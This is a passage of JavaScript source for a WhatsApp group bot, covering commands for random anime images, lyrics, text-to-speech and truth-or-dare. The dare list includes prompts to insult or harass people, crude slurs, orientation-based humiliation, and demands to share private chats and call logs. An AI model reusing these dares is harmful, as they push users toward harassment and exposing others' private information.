              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/nezuko.json"
            );
          if (/onepiece/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/onepiece.json"
            );
          if (/pentol/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/pentol.json"
            );
          if (/pokemon/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/pokemon.json"
            );
          if (/profil/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/profil.json"
            );
          if (/progamming/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/programming.json"
            );
          if (/pubg/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/pubg.json"
            );
          if (/randblackpink/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/randblackpink.json"
            );
          if (/randomnime/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/randomnime.json"
            );
          if (/randomnime2/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/randomnime2.json"
            );
          if (/rize/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/rize.json"
            );
          if (/rose/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/rose.json"
            );
          if (/ryujin/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/ryujin.json"
            );
          if (/sagiri/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/sagiri.json"
            );
          if (/sakura/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/sakura.json"
            );
          if (/sasuke/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/sasuke.json"
            );
          if (/satanic/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/satanic.json"
            );
          if (/shina/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/shina.json"
            );
          if (/shinka/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/shinka.json"
            );
          if (/shinomiya/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/shinomiya.json"
            );
          if (/shizuka/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/shizuka.json"
            );
          if (/shota/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/shota.json"
            );
          if (/space/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/tatasurya.json"
            );
          if (/technology/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/technology.json"
            );
          if (/tejina/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/tejina.json"
            );
          if (/toukachan/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/toukachan.json"
            );
          if (/tsunade/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/tsunade.json"
            );
          if (/waifu2/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/waifu.json"
            );
          if (/wallhp/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/wallhp.json"
            );
          if (/wallml/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/wallml.json"
            );
          if (/wallmlnime/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/wallnime.json"
            );
          if (/yotsuba/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/yotsuba.json"
            );
          if (/yuki/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/yuki.json"
            );
          if (/yulibocil/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/yulibocil.json"
            );
          if (/yumeko/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/yumeko.json"
            );
          let yeha = heyy[Math.floor(Math.random() * heyy.length)];
          OctopusBotzz.sendMessage(
            m.chat,
            { image: { url: yeha }, caption: mess.success },
            { quoted: m }
          );
        }
        break;
      case "lyrics":
        {
          if (!text)
            return replyLinkGc(
              `What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`
            );
          await XeonStickWait();
          const { lyrics, lyricsv2 } = require("@bochilteam/scraper");
          const result = await lyricsv2(text).catch(
            async (_) => await lyrics(text)
          );
          replyLinkGc(
            `
*Title :* ${result.title}
*Author :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim()
          );
        }
        break;
      case "pick":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!text)
            return replyLinkGc(
              `What do you want to pick?\nExample: ${prefix + command} idiot`
            );
          const groupMetadata = m.isGroup
            ? await OctopusBotzz.groupMetadata(m.chat).catch((e) => {})
            : "";
          const participants = m.isGroup
            ? await groupMetadata.participants
            : "";
          let member = participants.map((u) => u.id);
          let me = m.sender;
          let xeonshimts = member[Math.floor(Math.random() * member.length)];
          OctopusBotzz.sendMessage(
            from,
            {
              text: `The most *${text}* here is *@${xeonshimts.split("@")[0]}*`,
              contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true,
                mentionedJid: [xeonshimts],
                externalAdReply: {
                  showAdAttribution: true,
                  title: ` ${global.botname}`,
                  body: `${ownername}`,
                  containsAutoReply: true,
                  previewType: "PHOTO",
                  thumbnail: fs.readFileSync(
                    `./OctopusBotzzMedia/theme/oct.jpg`
                  ),
                  sourceUrl: `${wagc}`,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
      case "say":
      case "tts":
      case "gtts":
        {
          if (!text) return replyLinkGc("Where is the text?");
          let texttts = text;
          const xeonrl = googleTTS.getAudioUrl(texttts, {
            lang: "en",
            slow: false,
            host: "https://translate.google.com",
          });
          return OctopusBotzz.sendMessage(
            m.chat,
            {
              audio: {
                url: xeonrl,
              },
              mimetype: "audio/mp4",
              ptt: true,
              fileName: `${text}.mp3`,
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "fact":
        {
          const { data } = await axios.get(`https://nekos.life/api/v2/fact`);
          return replyLinkGc(`${themeemoji} *Fact:* ${data.fact}\n`);
        }
        break;
      case "quotes":
        const quotexeony = await axios.get(`https://favqs.com/api/qotd`);
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`;
        return replyLinkGc(textquotes);
        break;
      case "dare":
        const dare = [
          "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
          "spill people who make you pause",
          "call crush/pickle now and send ss",
          "drop only emote every time you type on gc/pc for 1 day.",
          "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
          "call ex saying miss",
          "sing the chorus of the last song you played",
          "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
          "Bang on the table (which is at home) until you get scolded for being noisy",
          "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
          "mention ex's name",
          "make 1 rhyme for the members!",
          "send ur whatsapp chat list",
          "chat random people with gheto language then ss here",
          "tell your own version of embarrassing things",
          "tag the person you hate",
          "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
          "change name to *I AM DONKEY* for 24 hours",
          "shout *ma chuda ma chuda ma chuda* in front of your house",
          "snap/post boyfriend photo/crush",
          "tell me your boyfriend type!",
          "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
          "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
          "prank chat ex and say *i love u, please come back.* without saying dare!",
          "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
          "change the name to *I am a child of randi* for 5 hours",
          "type in bengali 24 hours",
          "Use selmon bhoi photo for 3 days",
          "drop a song quote then tag a suitable member for that quote",
          "send voice note saying can i call u baby?",
          "ss recent call whatsapp",
          "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
          "pop to a group member, and say fuck you",
          "Act like a chicken in front of ur parents",
          "Pick up a random book and read one page out loud in vn n send it here",
          "Open your front door and howl like a wolf for 10 seconds",
          "Take an embarrassing selfie and paste it on your profile picture",
          "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
          "Walk on your elbows and knees for as long as you can",
          "sing national anthem in voice note",
          "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
          "Tell the saddest story you know",
          "make a twerk dance video and put it on status for 5mins",
          "Eat a raw piece of garlic",
          "Show the last five people you texted and what the messages said",
          "put your full name on status for 5hrs",
          "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
          "call ur bestie, bitch",
          "put your photo without filter on ur status for 10mins",
          "say i love oli london in voice noteðŸ¤£ðŸ¤£",
          "Send a message to your ex and say I still like you",
          "call Crush/girlfriend/bestie now and screenshot here",
          "pop to one of the group member personal chat and Say you ugly bustard",
          "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
          "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
          "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
          "use any bollywood actor photo as ur pfp for 3 days",
          "put your crush photo on status with caption, this is my crush",
          "change name to I AM GAY for 5 hours",
          "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
          "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
          "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
          "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
          "shout bravooooooooo and send here through voice note",
          "snap your face then send it here",
          "Send your photo with a caption, i am lesbian",
          "shout using harsh words and send it here through vn",
          "shout you bastard in front of your mom/papa",
          "change the name to i am idiot for 24 hours",
          "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
          "say i love the bot owner xeon through voice note",
          "send your gf/bf pic here",
          "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
          "breakup with your best friend for 5hrs without telling him/her that its a dare",
          "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
          "say i love depak kalal through voice note",
          "write i am feeling horny and put it on status, u can delete it only after 5hrs",
          "write i am lesbian and put it on status, u can delete only after 5hrs",
          "kiss your mommy or papa and say i love youðŸ˜Œ",
          "put your father name on status for 5hrs",
          "send abusive words in any grup, excepting this grup, and send screenshot proof here",
        ];
        const xeondare = dare[Math.floor(Math.random() * dare.length)];
        bufferdare = await getBuffer(
          `https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`
        );
        OctopusBotzz.sendMessage(
          from,
          {
            image: bufferdare,
            caption: "_You choose DARE_\n" + xeondare,
          },
          { quoted: m }
        );
        break;
        break;
      case "truth":
        const truth = [
          "Have you ever liked anyone? How long?",
          "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
          "apa ketakutan terbesar kamu?",
          "Have you ever liked someone and felt that person likes you too?",
          "What is the name of your friend's ex-girlfriend that you used to secretly like?",
          "Have you ever stolen money from your father or mom? The reason?",
          "What makes you happy when you're sad?",
          "Ever had a one sided love? if so who? how does it feel bro?",
          "been someone's mistress?",
          "the most feared thing",
          "Who is the most influential person in your life?",
          "what proud thing did you get this year",
          "Who is the person who can make you awesome",
          "Who is the person who has ever made you very happy?",
          "Who is closest to your ideal type of partner here",
          "Who do you like to play with??",
          "Have you ever rejected people? the reason why?",
          "Mention an incident that made you hurt that you still remember",
          "What achievements have you got this year??",
          "What's your worst habit at school??",
          "What song do you sing most in the shower",
          "Have you ever had a near-death experience",
          "When was the last time you were really angry. Why?",
          "Who is the last person who called you",
          "Do you have any hidden talents, What are they",
          "What word do you hate the most?",
          "What is the last YouTube video you watched?",
          "What is the last thing you Googled",
          "Who in this group would you want to swap lives with for a week",
          "What is the scariest thing thats ever happened to you",
          "Have you ever farted and blamed it on someone else",
          "When is the last time you made someone else cry",
          "Have you ever ghosted a friend",
          "Have you ever seen a dead body",
          "Which of your family members annoys you the most and why",
          "If you had to delete one app from your phone, which one would it be",
          "What app do you waste the most time on",
          "Have you ever faked sick to get home from school",
          "What is the most embarrassing item in your room",
          "What five items would you bring if you got stuck on a desert island",
          "Have you ever laughed so hard you peed your pants",
          "Do you smell your own farts",
          "have u ever peed on the bed while sleeping ??",
          "What is the biggest mistake you have ever made",
          "Have you ever cheated in an exam",
          "What is the worst thing you have ever done",
          "When was the last time you cried",
          "whom do you love the most among ur parents",
          "do u sometimes put ur finger in ur nosetril?",
          "who was ur crush during the school days",
          "tell honestly, do u like any boy in this grup",
          "have you ever liked anyone? how long?",
          "do you have gf/bf','what is your biggest fear?",
          "have you ever liked someone and felt that person likes you too?",
          "What is the name of your ex boyfriend of your friend that you once liked quietly?",
          "ever did you steal your mothers money or your fathers money",
          "what makes you happy when you are sad",
          "do you like someone who is in this grup? if you then who?",
          "have you ever been cheated on by people?",
          "who is the most important person in your life",
          "what proud things did you get this year",
          "who is the person who can make you happy when u r sad",
          "who is the person who ever made you feel uncomfortable",
          "have you ever lied to your parents",
          "do you still like ur ex",
          "who do you like to play together with?",
          "have you ever stolen big thing in ur life? the reason why?",
          "Mention the incident that makes you hurt that you still remember",
          "what achievements have you got this year?",
          "what was your worst habit at school?",
          "do you love the bot creator, xeon?ðŸ¤£",
          "have you ever thought of taking revenge from ur teacher?",
          "do you like current prime minister of ur country",
          "you non veg or veg",
          "if you could be invisible, what is the first thing you would do",
          "what is a secret you kept from your parents",
          "Who is your secret crush",
          "whois the last person you creeped on social media",
          "If a genie granted you three wishes, what would you ask for",
          "What is your biggest regret",
          "What animal do you think you most look like",
          "How many selfies do you take a day",
          "What was your favorite childhood show",
          "if you could be a fictional character for a day, who would you choose",
          "whom do you text the most",
          "What is the biggest lie you ever told your parents",
          "Who is your celebrity crush",
          "Whats the strangest dream you have ever had",
          "do you play pubg, if you then send ur id number",
        ];
        const xeontruth = truth[Math.floor(Math.random() * truth.length)];
        buffertruth = await getBuffer(
          `https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`
        );
        OctopusBotzz.sendMessage(
          from,
          {
            image: buffertruth,
            caption: "_You choose TRUTH_\n" + xeontruth,
          },
          { quoted: m }
        );
        break;
      case "cry":
      case "kill":
      case "hug":
      case "pat":
      case "lick":
      case "kiss":
      case "bite":
      case "yeet":
      case "bully":
      case "bonk":
      case "wink":
      case "poke":
      case "nom":
      case "slap":
      case "smile":
      case "wave":
      case "awoo":
      case "blush":
      case "smug":
      case "glomp":
      case "happy":
      case "dance":
      case "cringe":
      case "cuddle":
      case "highfive":
      case "shinobu":
      case "handhold":
        {
          axios
            .get(`https://api.waifu.pics/sfw/${command}`)
            .then(({ data }) => {
              OctopusBotzz.sendImageAsSticker(from, data.url, m, {
                packname: global.packname,
                author: global.author,
              });
            });
        }
        break;
      case "woof":
      case "8ball":
      case "goose":
      case "gecg":
      case "feed":
      case "avatar":
      case "fox_girl":
      case "lizard":
      case "spank":
      case "meow":
      case "tickle":
        {
          axios
            .get(`https://nekos.life/api/v2/img/${command}`)
            .then(({ data }) => {
              OctopusBotzz.sendImageAsSticker(from, data.url, m, {
                packname: global.packname,
                author: global.author,
              });
            });
        }
        break;
      case "animeawoo":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animemegumin":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeshinobu":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animehandhold":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animehighfive":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animecringe":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animedance":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animehappy":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeglomp":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animesmug":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeblush":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animewave":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animesmile":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animepoke":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animewink":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animebonk":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animebully":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeyeet":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animebite":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animelick":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animekill":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animecry":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animewlp":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animekiss":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animehug":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeneko":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animepat":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeslap":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animecuddle":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animewaifu":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animenom":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animefoxgirl":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animetickle":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animegecg":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "dogwoof":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "8ballpool":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "goosebird":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animefeed":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeavatar":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "lizardpic":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "catmeow":
        {
          await XeonStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: waifudd.data.url },
              caption: mess.success,
            },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "anime":
        {
          if (!text) return replyLinkGc(`Which anime are you lookin for?`);
          const malScraper = require("mal-scraper");
          await XeonStickWait();
          const anime = await malScraper
            .getInfoFromName(text)
            .catch(() => null);
          if (!anime) return replyLinkGc(`Could not find`);
          let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`;
          await OctopusBotzz.sendMessage(
            m.chat,
            { image: { url: anime.picture }, caption: animetxt },
